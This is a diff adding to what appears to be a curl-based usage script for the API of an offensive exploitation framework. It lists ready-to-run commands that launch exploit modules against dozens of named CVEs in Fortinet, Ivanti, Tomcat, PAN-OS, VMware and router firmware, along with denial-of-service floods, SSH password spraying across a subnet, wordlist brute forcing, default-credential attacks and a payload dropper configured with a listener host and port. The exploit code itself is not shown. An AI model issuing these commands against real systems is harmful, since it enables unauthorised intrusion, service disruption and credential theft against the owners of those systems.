@@ -994,3 +994,608 @@ curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
       "output_file": "sample_scan.txt"
     }
   }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# DOMAIN TARGETING — NEW
+# Target domains by name, resolved IP, or with custom protocol/port
+# ═══════════════════════════════════════════════════════════════
+
+# ─── Set Domain Target ────────────────────────────────────────
+# In interactive shell, setting a domain triggers protocol/port prompts:
+#   rsf> t example.com
+#   [*] Domain target detected: example.com
+#   [+] Resolved to: 93.184.216.34
+#   Select protocol:
+#     1) https (default)
+#     2) http
+#     3) https with custom port
+#     4) http with custom port
+#     5) Use resolved IP directly (no protocol)
+
+# API: Set domain target directly
+curl -s -X POST http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"target": "example.com"}' | python3 -m json.tool
+
+# API: Set domain with custom port
+curl -s -X POST http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"target": "example.com:8443"}' | python3 -m json.tool
+
+# API: Run scanner against domain target
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/port_scanner",
+    "target": "example.com",
+    "prompts": {
+      "port_range": "1-1000",
+      "timeout": "3",
+      "concurrency": "100"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# EXPLOIT MODULES — Router/Network/Framework/WebApp
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 33. SSH PWN Session ─────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/sshpwn_session",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "username": "root", "password": "toor", "mode": "2" }
+  }' | python3 -m json.tool
+
+# ─── 34. SSH PWN SFTP Attacks ────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/sshpwn_sftp_attacks",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "username": "root", "password": "toor", "mode": "1" }
+  }' | python3 -m json.tool
+
+# ─── 35. SSH PWN SCP Attacks ─────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/sshpwn_scp_attacks",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "username": "root", "password": "toor", "mode": "1" }
+  }' | python3 -m json.tool
+
+# ─── 36. SSH PWN Auth Password ───────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/sshpwn_auth_passwd",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "mode": "1" }
+  }' | python3 -m json.tool
+
+# ─── 37. SSH PWN PAM ────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/sshpwn_pam",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "username": "root", "password": "toor" }
+  }' | python3 -m json.tool
+
+# ─── 38. OpenSSH 9.8p1 Race Condition ───────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/opensshserver_9_8p1race_condition",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22" }
+  }' | python3 -m json.tool
+
+# ─── 39. Apache Tomcat CVE-2025-24813 RCE ───────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/apache_tomcat/cve_2025_24813_apache_tomcat_rce",
+    "target": "192.168.1.1",
+    "prompts": { "port": "8080" }
+  }' | python3 -m json.tool
+
+# ─── 40. Apache Tomcat CatKiller CVE-2025-31650 ─────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/apache_tomcat/catkiller_cve_2025_31650",
+    "target": "192.168.1.1",
+    "prompts": { "port": "8443" }
+  }' | python3 -m json.tool
+
+# ─── 41. FortiOS Auth Bypass CVE-2022-40684 ─────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/fortios_auth_bypass_cve_2022_40684",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 42. FortiOS SSL VPN CVE-2018-13379 ─────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/fortios_ssl_vpn_cve_2018_13379",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 43. FortiWeb RCE CVE-2021-22123 ────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/fortiweb_rce_cve_2021_22123",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 44. FortiWeb SQLi RCE CVE-2025-25257 ───────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/fortiweb_sqli_rce_cve_2025_25257",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 45. FortiSIEM RCE CVE-2025-64155 ───────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/fortisiem_rce_cve_2025_64155",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 46. FortiCloud SSO Auth Bypass CVE-2026-24858 ──────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/forticloud_sso_auth_bypass_cve_2026_24858",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 47. Ivanti Connect Secure Buffer Overflow ──────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/ivanti/ivanti_connect_secure_stack_based_buffer_overflow",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 48. Ivanti EPMM CVE-2023-35082 ────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/ivanti/ivanti_epmm_cve_2023_35082",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 49. vCenter Backup RCE ─────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/vmware/vcenter_backup_rce",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 50. vCenter File Read ──────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/vmware/vcenter_file_read",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 51. ESXi VM Escape Check ───────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/vmware/esxi_vm_escape_check",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 52. Trend Micro CVE-2025-5777 ──────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/trend_micro/cve_2025_5777",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 53. QNAP QTS RCE CVE-2024-27130 ───────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/qnap/qnap_qts_rce_cve_2024_27130",
+    "target": "192.168.1.1",
+    "prompts": { "port": "8080" }
+  }' | python3 -m json.tool
+
+# ─── 54. PAN-OS Auth Bypass CVE-2025-0108 ───────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/palo_alto/panos_authbypass_cve_2025_0108",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 55. TP-Link WR740N DoS ─────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/tplink/tplink_wr740n_dos",
+    "target": "192.168.0.1",
+    "prompts": { "port": "8082", "username": "admin", "password": "admin" }
+  }' | python3 -m json.tool
+
+# ─── 56. TP-Link Archer RCE CVE-2024-53375 ──────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/tplink/tplink_archer_rce_cve_2024_53375",
+    "target": "192.168.0.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 57. D-Link DCS-930L Auth Bypass ────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/dlink/dlink_dcs_930l_auth_bypass",
+    "target": "192.168.0.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 58. Ruijie Auth Bypass RCE CVE-2023-34644 ──────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/ruijie/ruijie_auth_bypass_rce_cve_2023_34644",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 59. Zyxel CPE CI CVE-2024-40890 ───────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/zyxel/zyxel_cpe_ci_cve_2024_40890",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 60. Jenkins 2.441 LFI ──────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/jenkins/jenkins_2_441_lfi",
+    "target": "192.168.1.1",
+    "prompts": { "port": "8080" }
+  }' | python3 -m json.tool
+
+# ─── 61. HTTP/2 Rapid Reset CVE-2023-44487 ──────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/http2/cve_2023_44487_http2_rapid_reset",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 62. PHP CGI CVE-2024-4577 ──────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/php/cve_2024_4577",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 63. Nginx PWNer ────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/nginx/nginx_pwner",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 64. Exim ETRN SQLi CVE-2025-26794 ─────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/exim/exim_etrn_sqli_cve_2025_26794",
+    "target": "192.168.1.1",
+    "prompts": { "port": "25" }
+  }' | python3 -m json.tool
+
+# ─── 65. MongoBleed ─────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/mongo/mongobleed",
+    "target": "192.168.1.1",
+    "prompts": { "port": "27017" }
+  }' | python3 -m json.tool
+
+# ─── 66. SharePoint CVE-2024-38094 ──────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/sharepoint/cve_2024_38094",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 67. Roundcube PostAuth RCE ─────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/roundcube/roundcube_postauth_rce",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 68. WordPress VitePOS CVE-2025-13156 ───────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/wordpress/vitepos_file_upload_cve_2025_13156",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 69. Flowise RCE CVE-2025-59528 ────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/flowise/cve_2025_59528_flowise_rce",
+    "target": "192.168.1.1",
+    "prompts": { "port": "3000" }
+  }' | python3 -m json.tool
+
+# ─── 70. Zabbix 7.0.0 SQL Injection ────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/zabbix/zabbix_7_0_0_sql_injection",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 71. n8n RCE CVE-2025-68613 ────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/n8n/n8n_rce_cve_2025_68613",
+    "target": "192.168.1.1",
+    "prompts": { "port": "5678" }
+  }' | python3 -m json.tool
+
+# ─── 72. React2Shell ────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/react/react2shell",
+    "target": "192.168.1.1",
+    "prompts": { "port": "3000" }
+  }' | python3 -m json.tool
+
+# ─── 73. DoS - Null SYN Exhaustion ──────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dos/null_syn_exhaustion",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 74. DoS - TCP Connection Flood ─────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dos/tcp_connection_flood",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 75. DoS - Connection Exhaustion Flood ──────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dos/connection_exhaustion_flood",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 76. FTP Pachev Path Traversal ──────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ftp/pachev_ftp_path_traversal_1_0",
+    "target": "192.168.1.1",
+    "prompts": { "port": "21" }
+  }' | python3 -m json.tool
+
+# ─── 77. FTP Bounce Test ────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ftp/ftp_bounce_test",
+    "target": "192.168.1.1",
+    "prompts": { "port": "21" }
+  }' | python3 -m json.tool
+
+# ─── 78. Heartbleed ─────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/crypto/heartbleed",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 79. Telnet Auth Bypass CVE-2026-24061 ──────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/telnet/telnet_auth_bypass_cve_2026_24061",
+    "target": "192.168.1.1",
+    "prompts": { "port": "23" }
+  }' | python3 -m json.tool
+
+# ─── 80. Payload Generators ─────────────────────────────────────
+# narutto_dropper, batgen, lnkgen, payload_encoder, polymorph_dropper
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/payloadgens/narutto_dropper",
+    "target": "10.0.0.5",
+    "prompts": { "lhost": "10.0.0.5", "lport": "4444" }
+  }' | python3 -m json.tool
+
+# ─── 81. SSH User Enum ──────────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ssh_user_enum",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "username_wordlist": "/usr/share/wordlists/usernames.txt" }
+  }' | python3 -m json.tool
+
+# ─── 82. SSH Spray ──────────────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ssh_spray",
+    "target": "192.168.1.0/24",
+    "prompts": { "port": "22", "username": "admin", "password": "admin", "concurrency": "20" }
+  }' | python3 -m json.tool
+
+# ─── 83. Telnet Hose ────────────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/telnet_hose",
+    "target": "192.168.1.1",
+    "prompts": { "port": "23" }
+  }' | python3 -m json.tool
+
+# ─── 84. Enable Bruteforce ──────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/enablebruteforce",
+    "target": "192.168.1.1",
+    "prompts": { "port": "23", "password_wordlist": "/usr/share/wordlists/rockyou.txt" }
+  }' | python3 -m json.tool
+
+# ─── 85. ACTi Camera Default Creds ──────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/camera/acti/acti_camera_default",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# UTILITY COMMANDS
+# ═══════════════════════════════════════════════════════════════
+
+# Clear target
+curl -s -X DELETE http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# Honeypot check
+curl -s -X POST http://127.0.0.1:8080/api/honeypot-check \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"target": "192.168.1.1"}' | python3 -m json.tool
+
+# Shell command (single)
+curl -s -X POST http://127.0.0.1:8080/api/shell \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"command": "modules"}' | python3 -m json.tool
+
+# Shell commands (chained)
+curl -s -X POST http://127.0.0.1:8080/api/shell \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"commands": ["t 192.168.1.1", "use scanners/port_scanner", "run"]}' \
+  | python3 -m json.tool
